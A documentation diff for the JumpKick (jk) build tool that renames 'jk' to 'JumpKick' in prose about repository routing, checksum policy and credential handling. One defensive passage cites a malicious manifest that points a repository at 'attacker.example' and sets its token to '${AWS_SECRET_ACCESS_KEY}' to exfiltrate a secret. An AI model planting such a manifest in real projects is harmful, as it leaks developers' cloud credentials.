@@ -11,7 +11,7 @@ the order and for why a credential only travels to the origin its name is bound 
 package registries, S3/MinIO, and GCS are supported. After lock, a build reads the repository's artifacts where they live: Maven Central, and every
 repository an active profile of your `~/.m2/settings.xml` declares, keep their artifacts in the
 Maven local repository (`~/.m2/repository`), once, shared with Maven; every other origin keeps a
-tree under `JK_STORE_DIR/repos/` (see below). jk's `.jk` memos for the former live in the store,
+tree under `JK_STORE_DIR/repos/` (see below). JumpKick's `.jk` memos for the former live in the store,
 never in `~/.m2`. A file already in the local repository is used where it is once it verifies,
 not copied and not downloaded. Set `[m2] integration = false` to keep every origin's artifacts in
 its own store tree and leave the Maven local repository alone. `jk install` writes the Maven local repo
@@ -24,7 +24,7 @@ by default; `[install] destination = "jk"` keeps a project's artifacts in `repos
 The name you give a repository is yours alone — a label. The store keys each repository's tree
 by **where its bytes come from**: `repos/<origin-id>/`, where the id is the origin's host followed
 by a digest of its canonical URL (`repos/nexus.acme.com-3f9a1c2b4d5e/`), and the three public
-origins jk ships with keep their reserved words (`repos/central`, `repos/google`,
+origins JumpKick ships with keep their reserved words (`repos/central`, `repos/google`,
 `repos/jumpkick`). So two projects that both call a repository `private` but point it at
 different servers never share a cache — a POM or jar fetched for one origin is never served as
 the other's, and a poisoned mirror reaches only the projects that actually resolve from it —
@@ -64,7 +64,7 @@ coordinate, and a miss there is asked of the other remotes. Declared `groups` on
 ### A repository that does not answer
 
 A repository that gives no answer within the request timeout (60 s) is passed over for the rest of
-the resolve, as a blocked one is, and jk says so once: the timeout is paid once, not once per
+the resolve, as a blocked one is, and JumpKick says so once: the timeout is paid once, not once per
 coordinate, and a package only it serves fails naming it. The next resolve asks it again. A GitLab
 project package registry asked for Central's artifacts is the usual case. A repository a mirror
 stands in for is the exception: the mirror is the only route to it, so its silence stops the
@@ -109,9 +109,9 @@ Cloudflare's headers is a permission answer and is reported as one.
 
 A plugin whose own resolver fetches outside the lock — the Quarkus augment reads its build-time
 deployment closure through Quarkus's embedded Maven resolver — is handed this module's remotes as
-jk routes them: the `[repositories]` set over the built-in remotes, in resolve order, a mirror
+JumpKick routes them: the `[repositories]` set over the built-in remotes, in resolve order, a mirror
 (`config.toml` or `settings.xml`) standing in for the repository it mirrors, and Central at the mirror while
-the window is open, each with the credential jk would send. The fork asks those and nothing else;
+the window is open, each with the credential JumpKick would send. The fork asks those and nothing else;
 Maven's own defaults and `~/.m2/settings.xml`'s repositories are never consulted, so a Central
 refusal is answered by the window here rather than by a failed package step.
 
@@ -197,11 +197,11 @@ groups = ["com.acme", "com.acme.*"]
 - **Bound group** → solver only sees versions from claiming repos (a higher version
   planted on Central cannot win).
 - **Unbound group** → general remotes in declared order; first repo advertising any
-  version answers. Only when every general remote misses does jk fall back to
+  version answers. Only when every general remote misses does JumpKick fall back to
   non-claiming specialists.
 - **Already locked** artifacts keep their lockfile source pin until you re-resolve that
   line (`jk update`).
-- Multiple repositories **without** any `groups` → jk **warns once** per lock (still
+- Multiple repositories **without** any `groups` → JumpKick **warns once** per lock (still
   resolves). Add exclusive bindings for internal namespaces.
 
 `jk repo refresh <coord>` re-fetches a coordinate (lock-time checksum mismatch is
@@ -225,14 +225,14 @@ allow-unverified = true
 
 | Key | Default | What it accepts | The threat it accepts |
 |-----|---------|-----------------|-----------------------|
-| `allow-insecure` | `false` | A plaintext `http://` URL. Without it the manifest fails to load, naming the repository and URL. Loopback hosts (`localhost`, `127.*`, `::1`) need no opt-in: there is no network path to sit on. A loopback repository is also asked afresh on every lock — the engine keeps no "not found" or version-list memo for a port that may belong to another process next time. | Anyone on the network path can replace the bytes jk pins, and the lockfile then faithfully protects the tampered jar. |
+| `allow-insecure` | `false` | A plaintext `http://` URL. Without it the manifest fails to load, naming the repository and URL. Loopback hosts (`localhost`, `127.*`, `::1`) need no opt-in: there is no network path to sit on. A loopback repository is also asked afresh on every lock — the engine keeps no "not found" or version-list memo for a port that may belong to another process next time. | Anyone on the network path can replace the bytes JumpKick pins, and the lockfile then faithfully protects the tampered jar. |
 | `blocked` | `false` | Nothing: the repository is known and never asked, as Maven 3.9 blocks a plaintext `http://` repository by default. A plaintext URL parses under it without `allow-insecure`, and `jk import` writes a POM's plaintext `<repository>` this way. A package no other repository serves fails the lock naming the blocked repository, with the plaintext refusal and the two ways out; `blocked` beside `allow-insecure` is refused, since one says never ask and the other says ask. | None: the repository is dialed by nothing. |
 | `allow-unverified` | `false` | Pinning an artifact the repository publishes no `.sha256`, `.sha1` or `.md5` for. Without it `jk lock` / `jk update` fail, naming the artifact and repository. An `.md5` alone is accepted without the key, with a note in the lock output naming the artifact and the weaker digest. | The pin is taken from whatever the wire delivered, with nothing from the publisher vouching for it. |
 
 Both are refused on `central`: Maven Central serves https and publishes a checksum for every
 artifact, so the opt-in would only ever hide an attack. `file://` repositories are local disk
 with no network path, so neither key applies to them. A `file://` repository with no
-`maven-metadata.xml` for a module — a Maven local repository, a jk store tree — lists the module's
+`maven-metadata.xml` for a module — a Maven local repository, a JumpKick store tree — lists the module's
 version directories instead, each one that holds its `<artifact>-<version>.pom`, so `latest`, `^`,
 `~` and ranges resolve through it; a `-SNAPSHOT` directory follows the
 [release and snapshot policy](#release-and-snapshot-policy) like a catalog's entry.
@@ -321,7 +321,7 @@ Tool distribution mirrors and npm registries use the same chain, keyed by host �
 ### On CI, in a container, over SSH
 
 A CI server, a build container, an SSH session and an engine started by systemd have no desktop
-and no keychain, and that is the normal case. Give jk the secret the way the machine already holds
+and no keychain, and that is the normal case. Give JumpKick the secret the way the machine already holds
 it:
 
 - **From the CI secret store:** `JK_REPO_<ID>_TOKEN` (or `_USERNAME` + `_PASSWORD`) as an
@@ -349,7 +349,7 @@ variables:
 ```
 
 `jk repo login` works headless too: the secret goes in the owner-only record without a word (see
-[Where a login keeps its secret](#where-a-login-keeps-its-secret)). jk never prompts for, waits on,
+[Where a login keeps its secret](#where-a-login-keeps-its-secret)). JumpKick never prompts for, waits on,
 or warns about a keychain on a machine that has none.
 
 ### A credential for one project's repository
@@ -373,7 +373,7 @@ project's `jk.toml`.
 ### Secret references
 
 A credential value, an object-store key and a `[mirrors]` value can be a reference instead of the
-secret itself. jk expands it each time the repository is used:
+secret itself. JumpKick expands it each time the repository is used:
 
 | Spelling | Value |
 |----------|-------|
@@ -392,34 +392,34 @@ password = "${file:~/.jk/secrets.properties#corp.password}"
 
 - `~` expands to your home. A relative path is relative to `~/.jk/`, the directory of the file
   that declares it.
-- On Linux and macOS, jk refuses a file that its group or other users can read, and names the
+- On Linux and macOS, JumpKick refuses a file that its group or other users can read, and names the
   fix: `chmod 600 <file>`. The check follows symlinks. Windows is not checked.
 - A container platform's secret mount is accepted at its default mode. Docker and Compose mount
   secrets in `/run/secrets` as `0444`, and Kubernetes mounts service-account and workload-identity
-  tokens in `/var/run/secrets` as `0644`. Under those two directories, jk reads a file that others
+  tokens in `/var/run/secrets` as `0644`. Under those two directories, JumpKick reads a file that others
   can read, as long as only its owner can write it and that owner is root or you. Only root can
-  create those directories, so jk doesn't need to detect a container. Accepting the file allows only
+  create those directories, so JumpKick doesn't need to detect a container. Accepting the file allows only
   what the mount already allows: other users on the machine can read it too. A mounted file that
   someone else owns, or that its group or others can write, is still refused.
 - Mount a Kubernetes secret volume under `/var/run/secrets`, for example
   `mountPath: /var/run/secrets/nexus`, and it is accepted at its default mode. That includes
-  `defaultMode: 0440` with `fsGroup`, which is how a non-root jk reads a root-owned secret. Mounted
+  `defaultMode: 0440` with `fsGroup`, which is how a non-root JumpKick reads a root-owned secret. Mounted
   anywhere else (such as `/etc/secrets`), the file must be readable by its owner alone: set
-  `defaultMode: 0400`, which only a root jk can read. For a Compose secret with a custom `target`,
+  `defaultMode: 0400`, which only a root JumpKick can read. For a Compose secret with a custom `target`,
   set `mode: 0400`.
 - A missing file, a missing key, or an empty value is an error that names
-  `repositories.<id>.<key>` and the path. jk never falls back to an anonymous request.
+  `repositories.<id>.<key>` and the path. JumpKick never falls back to an anonymous request.
 - A repository only `~/.jk/config.toml` declares, whose reference does not resolve (an unset
   variable, a missing file), fails only the resolves that ask it: it sends nothing and refuses each
   request, naming the reference, while every project that never asks it resolves as usual. A
   repository the project declares fails the resolve at once.
-- jk re-reads the file whenever its modification time, size or identity changes, so a rotated
+- JumpKick re-reads the file whenever its modification time, size or identity changes, so a rotated
   secret takes effect on the next command. You don't need `jk engine stop`.
-- jk masks every value it reads in its output, `-o jsonl` and the engine log, the same way it masks
+- JumpKick masks every value it reads in its output, `-o jsonl` and the engine log, the same way it masks
   every other credential.
 
 A `JK_REPO_<ID>_*_FILE` variable follows the same permission rule. Setting both
-`JK_REPO_<ID>_TOKEN` and `JK_REPO_<ID>_TOKEN_FILE` is an error. jk reads the `_FILE` variable from
+`JK_REPO_<ID>_TOKEN` and `JK_REPO_<ID>_TOKEN_FILE` is an error. JumpKick reads the `_FILE` variable from
 the shell that runs `jk`, never from a project's `.env`, so a cloned project can't choose which of
 your files a credential comes from. A relative path is relative to your home directory.
 
@@ -441,7 +441,7 @@ username = "aws"
 password = "${cmd:aws codeartifact get-authorization-token --domain acme --domain-owner 111122223333 --query authorizationToken --output text #ttl=30m}"
 ```
 
-- jk splits the command into words the way it splits `[scripts]`, with single and double quotes,
+- JumpKick splits the command into words the way it splits `[scripts]`, with single and double quotes,
   and runs it without a shell. To use pipes or `$VAR` expansion, write `sh -c '…'` yourself.
 - The helper runs with the environment of the shell that ran `jk`, so `PATH`, `gcloud`'s active
   account and `AWS_PROFILE` match your terminal, not the shell that started the engine. Its
@@ -452,7 +452,7 @@ password = "${cmd:aws codeartifact get-authorization-token --domain acme --domai
 - The engine reuses a helper's value for 15 minutes. Set a different time with a `#ttl=` suffix
   (`s`, `m` or `h`) at the end of the command. The cache is keyed by the command and your
   environment, and concurrent resolves share one run.
-- When the repository answers 401 or 403, jk drops the cached value, runs the helper once more,
+- When the repository answers 401 or 403, JumpKick drops the cached value, runs the helper once more,
   and sends the request once more. A second refusal is the answer.
 - A helper runs again at most once per command. If the value it printed on that second run is
   refused too, every other repository and module that uses it fails at once, so an expired SSO login
@@ -460,11 +460,11 @@ password = "${cmd:aws codeartifact get-authorization-token --domain acme --domai
   The failure names the repository and the refusal, and says why no other value was sent: the
   helper's re-run value was refused too, or the helper failed and what it said.
 - A plugin step whose own resolver runs in a separate process (the Quarkus augment's) is handed
-  the credential once and cannot ask for it again. jk hands it a value the helper printed during
+  the credential once and cannot ask for it again. JumpKick hands it a value the helper printed during
   this command, running the helper if the cached value came from an earlier one. The value must
   stay valid for as long as that step runs; a token that expires mid-step fails the step with a
   401, and the next command hands it a fresh one.
-- jk masks what the helper prints, as it masks every other credential.
+- JumpKick masks what the helper prints, as it masks every other credential.
 
 `${cmd:…}` works only in `~/.jk/config.toml`. Anywhere else it is a parse error, not a warning:
 a project that could name a command would run it on your machine at its first resolve.
@@ -484,7 +484,7 @@ record under `~/.jk/creds/forge/<host>` holds only the pointer.
 Everywhere else the secret stays in the owner-only record, silently:
 
 - On a CI server (`CI`, `GITHUB_ACTIONS`, `GITLAB_CI`, `JENKINS_URL`, `BUILDKITE`, … is set) or in a
-  container (`/.dockerenv`, `/run/.containerenv`, `container` or `KUBERNETES_SERVICE_HOST`), jk asks
+  container (`/.dockerenv`, `/run/.containerenv`, `container` or `KUBERNETES_SERVICE_HOST`), JumpKick asks
   no keychain at all.
 - With no keychain on the machine — no D-Bus session bus or no `secret-tool` on Linux, a macOS
   login keychain that is locked with no window server to unlock it (SSH, launchd), a Windows SSH
@@ -492,7 +492,7 @@ Everywhere else the secret stays in the owner-only record, silently:
 - A keychain that is there and refuses (a locked GNOME Keyring collection, a denial) earns one
   notice saying why, except over SSH with no display, where nobody could have unlocked it.
 
-jk never shows or waits on an unlock prompt. Before every keychain call it checks, without
+JumpKick never shows or waits on an unlock prompt. Before every keychain call it checks, without
 prompting, whether the keychain is locked — on Linux by reading the default collection's `Locked`
 property with `busctl` or `gdbus`, on macOS by reading the default keychain's lock status from the
 Security framework — and a locked keychain is a refusal on the spot. A check takes
@@ -546,7 +546,7 @@ A user-config declaration outranks the rest: if it names another origin than the
 credential stays home even when a `JK_REPO_<ID>_HOST` agrees with the project.
 
 When a credential exists but nothing binds it — or something binds it elsewhere — the repository
-is accessed anonymously and jk warns once per run, naming the repository, the origin it declares,
+is accessed anonymously and JumpKick warns once per run, naming the repository, the origin it declares,
 the source that was held back and what would send it:
 
 ```
@@ -569,7 +569,7 @@ An inline `${VAR}` reads your shell too, and which file wrote it decides whether
 A project manifest is anyone's: a cloned one declaring `[repositories.internal] url =
 "https://attacker.example/" token = "${AWS_SECRET_ACCESS_KEY}"` would otherwise receive that value in
 the `Authorization` header of its first resolve. So a project's reference to any other variable is
-refused, the repository is accessed anonymously, and jk warns once per run:
+refused, the repository is accessed anonymously, and JumpKick warns once per run:
 
 ```
 jk: warning: internal at https://attacker.example: no credential sent; jk.toml cannot use ${AWS_SECRET_ACCESS_KEY}
@@ -597,7 +597,7 @@ in a new terminal is enough; no `jk engine stop` is needed.
 
 A team already on Maven usually reaches the outside world through `~/.m2/settings.xml`: a
 `<mirror>` that sends `central` (or `*`) to Nexus or Artifactory, a `<proxy>` in front of it, and
-the internal repositories listed in a profile that `<activeProfiles>` turns on. jk reads the same
+the internal repositories listed in a profile that `<activeProfiles>` turns on. JumpKick reads the same
 file, so `jk build` on an unmodified `pom.xml` and `jk import pom.xml` work on the machine `mvn`
 works on, with nothing added to the project:
 
@@ -662,7 +662,7 @@ stored there is removed, so a stub that reappears on a reused port in a later ru
 predecessor's artifacts from disk. Within one engine's lifetime the tree is a warm store like any
 other; an ssh-tunnelled repository re-downloads once per engine lifetime.
 
-**A `<proxy>` is jk's proxy for every request** — artifacts, JDK and tool distributions, forge
+**A `<proxy>` is JumpKick's proxy for every request** — artifacts, JDK and tool distributions, forge
 APIs — for the protocol it names, between `~/.jk/config.toml [network]` and the shell's
 `https_proxy` / `http_proxy` — see [Config § Network](config.md#network). Its username and
 password ride as Basic; its `nonProxyHosts` (`|`-separated globs) go direct. A proxy that admits
@@ -682,7 +682,7 @@ user file (Maven's `-s`). Both files are re-read when they change, so editing on
 `jk engine stop`. `jk doctor` prints which files the engine read, every mirror with the built-in
 remotes it stands in for, the proxies and the profile repositories. Not read:
 `<pluginRepositories>`, `<pluginGroups>`, and a `<server>`'s `<privateKey>`, `<passphrase>` and
-`<configuration>` (a private key serves scp and sftp repositories, which jk does not speak).
+`<configuration>` (a private key serves scp and sftp repositories, which JumpKick does not speak).
 
 ### `${...}` in `settings.xml`
 
@@ -698,7 +698,7 @@ keeps the password out of the file:
 
 This covers `<server>` usernames and passwords, `<mirror>`, `<proxy>` and profile
 repository URLs, and `<localRepository>`. An expression that does not resolve stays as written,
-as Maven leaves it, and jk warns once per run, naming the file, the element and the expression
+as Maven leaves it, and JumpKick warns once per run, naming the file, the element and the expression
 (`` <server> `nexus` <password> names ${env.NEXUS_PASSWORD} ``) —
 the literal will answer 401, and the warning says why. An unresolved `<localRepository>` falls
 back to `~/.m2/repository` instead. `jk doctor` shows mirror URLs expanded, with any credential in
@@ -712,33 +712,33 @@ itself written by `mvn --encrypt-master-password`. `JK_M2_SETTINGS_SECURITY=<fil
 security file (Maven's `-Dsettings.security`), and a `<relocation>` in the file is followed; a
 relative relocation is taken against the directory of the file that names it. Text outside the
 braces is a comment, as in Maven. A value that does not decrypt — no security file, a master that
-does not decrypt, a different master — is not sent: jk warns once per run, naming the `<server>`
+does not decrypt, a different master — is not sent: JumpKick warns once per run, naming the `<server>`
 id and the file, and the repository is accessed anonymously.
 
 This is compatibility, not protection. The master password that unlocks every value sits beside
 them, under a passphrase that is the same on every machine, so anyone who can read both files can
-read the passwords. jk reads the format so a working Maven setup keeps working, and does not
+read the passwords. JumpKick reads the format so a working Maven setup keeps working, and does not
 write it. To keep a credential out of plain text, use [`jk repo login`](#credentials), or a
 `${file:…}` or `${cmd:…}` reference in `~/.jk/config.toml`.
 
 Maven 4's `mvnenc` format (`{[name=master,cipher=AES/GCM/NoPadding,version=…]…}`) is decrypted
 too, with the master password that the `master` configuration of `~/.m2/settings-security4.xml`
 names a source for (`JK_M2_SETTINGS_SECURITY4=<file>` names another file, Maven's
-`-Dmaven.settings.security`). jk reads the sources that need nobody at the keyboard:
+`-Dmaven.settings.security`). JumpKick reads the sources that need nobody at the keyboard:
 
 | Source | Read as |
 |---|---|
 | `env:NAME` | the variable in the shell that ran `jk`, like `${env.NAME}` |
 | `file:/absolute/path` | the file's first line that does not start with `#` |
-| `gpg-agent:socket` | the passphrase the agent has cached for Maven; jk always asks with `--no-ask`, so the agent never opens a pinentry, `?non-interactive` or not |
+| `gpg-agent:socket` | the passphrase the agent has cached for Maven; JumpKick always asks with `--no-ask`, so the agent never opens a pinentry, `?non-interactive` or not |
 
 `console-prompt`, `pinentry-prompt:` and `onepassword:` ask someone for the password, and
-`system-property:` reads Maven's own JVM, so jk does not read them: the value is dropped with a
+`system-property:` reads Maven's own JVM, so JumpKick does not read them: the value is dropped with a
 warning naming the source, as for any password that does not decrypt. A `masterSourceLookup`
 value (`{[name=masterSourceLookup,…]env:NAME}`) reads its source the same way, and a `legacy` one
 is Maven 3's format above. When gpg-agent has nothing cached, let a `mvn` run ask for it once
 (without `?non-interactive`, Maven's pinentry caches it), or preset it with `gpg-preset-passphrase`
-under the cache id `plexus:secDispatcherMasterPassword`; jk asks the agent again on every
+under the cache id `plexus:secDispatcherMasterPassword`; JumpKick asks the agent again on every
 command.
 
 The `gpg-agent:` source is verified on Linux against a real agent (`jk test -p live`). It needs
@@ -746,7 +746,7 @@ the agent's Unix socket. On macOS it is unverified: macOS ships no GnuPG, and th
 one on `PATH` (GnuPG 2.1 or later from Homebrew, MacPorts or GPG Suite, whose agent listens on a
 Unix socket as on Linux); without it the test is skipped. On
 Windows it is unsupported and unverified: Gpg4win's agent socket is an emulation file, not a
-socket jk connects to, so use `env:` or `file:` there.
+socket JumpKick connects to, so use `env:` or `file:` there.
 
 ## Related
 
